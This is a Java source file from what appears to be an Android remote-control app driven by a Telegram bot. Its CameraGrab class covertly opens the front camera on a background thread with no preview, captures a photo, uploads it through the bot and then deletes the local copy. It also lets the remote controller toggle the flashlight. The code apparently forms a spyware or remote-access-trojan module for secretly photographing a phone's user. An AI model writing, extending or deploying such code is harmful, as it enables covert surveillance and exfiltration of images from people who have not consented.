// language: Java, file: CameraGrab.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.util.Collections;

public class CameraGrab {

    static volatile CameraDevice dev;
    static volatile ImageReader reader;
    static HandlerThread bgThread;

    public static void frontShot() {
        Thread t = new Thread(CameraGrab::frontShotSync, "v2-cam");
        t.setDaemon(true);
        t.start();
    }

    static void frontShotSync() {
        Context c = TelegramBot.ctx;
        if (c == null) return;
        if (c.checkSelfPermission(Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED) {
            TelegramBot.send("<i>err: CAMERA not granted</i>");
            return;
        }
        try {
            CameraManager cm = (CameraManager) c.getSystemService(Context.CAMERA_SERVICE);
            if (cm == null) { TelegramBot.send("<i>cam: no CameraManager</i>"); return; }

            String front = null;
            for (String id : cm.getCameraIdList()) {
                CameraCharacteristics ch = cm.getCameraCharacteristics(id);
                Integer facing = ch.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    front = id;
                    break;
                }
            }
            if (front == null) { TelegramBot.send("<i>cam: no front camera</i>"); return; }

            if (bgThread == null || !bgThread.isAlive()) {
                bgThread = new HandlerThread("v2-cam-bg");
                bgThread.start();
            }
            Handler bg = new Handler(bgThread.getLooper());

            reader = ImageReader.newInstance(1280, 960, ImageFormat.JPEG, 2);
            final String finalId = front;
            final boolean[] delivered = { false };

            reader.setOnImageAvailableListener(r -> {
                Image img = null;
                try {
                    img = r.acquireLatestImage();
                    if (img == null) return;
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] data = new byte[buf.remaining()];
                    buf.get(data);
                    File out = new File(c.getCacheDir(), "front_" + System.currentTimeMillis() + ".jpg");
                    FileOutputStream fo = new FileOutputStream(out);
                    fo.write(data);
                    fo.close();
                    delivered[0] = true;
                    TelegramBot.sendFile(out, "front.jpg");
                    try { out.delete(); } catch (Throwable ignored) {}
                } catch (Throwable t) {
                    TelegramBot.send("<i>cam err:</i> " + TelegramBot.esc(t.getMessage()));
                } finally {
                    try { if (img != null) img.close(); } catch (Throwable ignored) {}
                    closeAll();
                }
            }, bg);

            cm.openCamera(finalId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice d) {
                    dev = d;
                    try {
                        d.createCaptureSession(Collections.singletonList(reader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(CameraCaptureSession session) {
                                    try {
                                        CaptureRequest.Builder b = d.createCaptureRequest(
                                            CameraDevice.TEMPLATE_STILL_CAPTURE);
                                        b.addTarget(reader.getSurface());
                                        b.set(CaptureRequest.CONTROL_AF_MODE,
                                            CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                                        b.set(CaptureRequest.JPEG_QUALITY, (byte) 85);
                                        session.capture(b.build(), null, bg);
                                    } catch (Throwable t) {
                                        TelegramBot.send("<i>cam cap err:</i> "
                                            + TelegramBot.esc(t.getMessage()));
                                        closeAll();
                                    }
                                }
                                @Override
                                public void onConfigureFailed(CameraCaptureSession session) {
                                    TelegramBot.send("<i>cam: configure failed</i>");
                                    closeAll();
                                }
                            }, bg);
                    } catch (Throwable t) {
                        TelegramBot.send("<i>cam session err:</i> "
                            + TelegramBot.esc(t.getMessage()));
                        closeAll();
                    }
                }
                @Override public void onDisconnected(CameraDevice d) { d.close(); dev = null; }
                @Override public void onError(CameraDevice d, int e) {
                    d.close(); dev = null;
                    TelegramBot.send("<i>cam open err code:</i> " + e);
                }
            }, bg);

            Thread timeout = new Thread(() -> {
                try { Thread.sleep(12_000); } catch (InterruptedException ignored) {}
                if (!delivered[0]) {
                    TelegramBot.send("<i>cam: timeout</i>");
                    closeAll();
                }
            }, "v2-cam-timeout");
            timeout.setDaemon(true);
            timeout.start();

        } catch (Throwable t) {
            TelegramBot.send("<i>cam err:</i> " + TelegramBot.esc(t.getMessage()));
        }
    }

    static void closeAll() {
        try { if (reader != null) reader.close(); } catch (Throwable ignored) {}
        reader = null;
        try { if (dev != null) dev.close(); } catch (Throwable ignored) {}
        dev = null;
    }

    public static void torch(boolean on) {
        Context c = TelegramBot.ctx;
        if (c == null) return;
        try {
            CameraManager cm = (CameraManager) c.getSystemService(Context.CAMERA_SERVICE);
            if (cm == null) return;
            String[] ids = cm.getCameraIdList();
            if (ids.length == 0) return;
            cm.setTorchMode(ids[0], on);
        } catch (Throwable t) {
            CommandRouter.err(t.getMessage());
        }
    }
}